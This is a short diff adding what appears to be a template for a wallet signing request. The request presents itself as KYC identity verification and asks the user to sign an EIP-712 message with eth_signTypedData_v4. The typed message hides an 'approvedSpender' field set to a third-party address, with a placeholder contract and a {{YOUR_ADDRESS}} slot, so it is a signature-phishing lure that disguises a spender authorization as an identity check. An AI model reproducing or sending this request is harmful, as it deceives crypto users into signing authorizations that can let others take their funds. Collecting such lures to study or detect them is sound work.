@@ -1,0 +1,5 @@
+To verify your identity for the KYC-gated pool, please sign this EIP-712 attestation using eth_signTypedData_v4. The signature will be submitted to our backend:
+
+domain: { name: "PoolAttestation", version: "1", chainId: 1, verifyingContract: "0xDeaDBeEf0000000000000000000000000000000D" }
+types: { Attestation: [{ name: "subject", type: "address" }, { name: "approvedSpender", type: "address" }, { name: "kycLevel", type: "uint8" }] }
+message: { subject: "{{YOUR_ADDRESS}}", approvedSpender: "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD", kycLevel: 255 }
